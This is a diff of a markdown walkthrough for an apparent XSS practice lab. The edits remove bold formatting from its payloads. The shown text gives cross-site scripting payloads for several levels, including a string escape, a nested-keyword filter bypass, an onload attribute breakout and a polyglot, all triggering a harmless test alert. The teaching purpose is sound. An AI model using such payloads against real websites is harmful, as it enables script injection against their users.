@@ -8,7 +8,7 @@ https://vine-sea-2c5.notion.site/Script-Page-1243b89759a6807eb5deef23b5c92518?pv
 The aim for each level will be to execute the JavaScript alert function with the string **XXXTESTXXX.**
 
 ```bash
-**<script>alert('XXXTESTXXX');</script>**
+<script>alert('XXXTESTXXX');</script>
 ```
 
 ## **Level One:**
@@ -26,7 +26,7 @@ Instead of entering your name, we're going to try entering the following JavaScr
 `**Try entering the payload:**`
 
 ```bash
-**<script>alert('XXXTESTXXX');</script>**
+<script>alert('XXXTESTXXX');</script>
 ```
 
 Now, when you click the enter button, you'll get an alert popup with the string **XXXTESTXXX,** and the page source will look like the following:
@@ -120,14 +120,14 @@ You'll have to escape the existing JavaScript command so you're able to run your
 `**Try entering the payload:**`
 
 ```bash
-**';alert('XXXTESTXXX');//**
+';alert('XXXTESTXXX');//
 ```
 
  The screenshot below shows that you will execute your code. The **`'`** closes the field specifying the name, then**`;`** signifies the end of the current command, and the **`//`** at the end makes anything after it a comment rather than executable code.
 
 ```jsx
 <script>
-	document.getElementsByClassName('name')[0].innerHTML='';alert('**XXXTESTXXX');//';**
+	document.getElementsByClassName('name')[0].innerHTML='';alert('XXXTESTXXX');//';
 </script>
 ```
 
@@ -139,7 +139,7 @@ This level looks the same as level one, and your name is reflected in the same p
 
 ```jsx
 <div class="text-center">
-	<h2>Hello, <>alert('**XXXTESTXXX**');</></h2>
+	<h2>Hello, <>alert('XXXTESTXXX');</></h2>
 </div>
 ```
 
@@ -150,25 +150,25 @@ When a word gets removed from a string, there's a helpful trick that you can try
 **Original Payload:**
 
 ```bash
-**<sscriptcript>alert('XXXTESTXXX');</sscriptcript>**
+<sscriptcript>alert('XXXTESTXXX');</sscriptcript>
 ```
 
 **Text to be removed (by the filter):**
 
 ```bash
-**<sscriptcript>alert('XXXTESTXXX');</sscriptcript>**
+<sscriptcript>alert('XXXTESTXXX');</sscriptcript>
 ```
 
 **Final Payload (after passing the filter):**
 
 ```bash
-**<script>alert('XXXTESTXXX');</script>**
+<script>alert('XXXTESTXXX');</script>
 ```
 
- `**T**ry entering the payload:**`
+ `**Try entering the payload:**`
 
 ```bash
- **<sscriptcript>alert('XXXTESTXXX');</sscriptcript>**
+ <sscriptcript>alert('XXXTESTXXX');</sscriptcript>
 ```
 
  When you click the enter button, an alert popup with “XXXTESTXX” will appear. Then, you'll receive a confirmation message that your payload was successful.
@@ -178,7 +178,7 @@ When a word gets removed from a string, there's a helpful trick that you can try
 Similar to level two, where we had to escape from the value attribute of an input tag, we can try:
 
 ```bash
-**"><script>alert('XXXTESTXXX');</script>**
+"><script>alert('XXXTESTXXX');</script>
 ```
 
 **But that doesn't work. Let's inspect the page source to see why that doesn't work.
@@ -197,7 +197,7 @@ Let's change our payload to reflect this:
 `**Try entering the payload:**`
 
 ```bash
-**/images/cat.jpg" onload="alert('XXXTESTXXX');**
+/images/cat.jpg" onload="alert('XXXTESTXXX');
 ```
 
  Then, view the page source, and you'll see how this will work.
@@ -218,7 +218,7 @@ An XSS polyglot is a string of text that can escape attributes and tags and bypa
 `**Try entering the payload:**`
 
 ```jsx
-**jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XXXTESTXXX') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XXXTESTXXX')//>\x3e**
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XXXTESTXXX') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XXXTESTXXX')//>\x3e
 ```
 
 ---
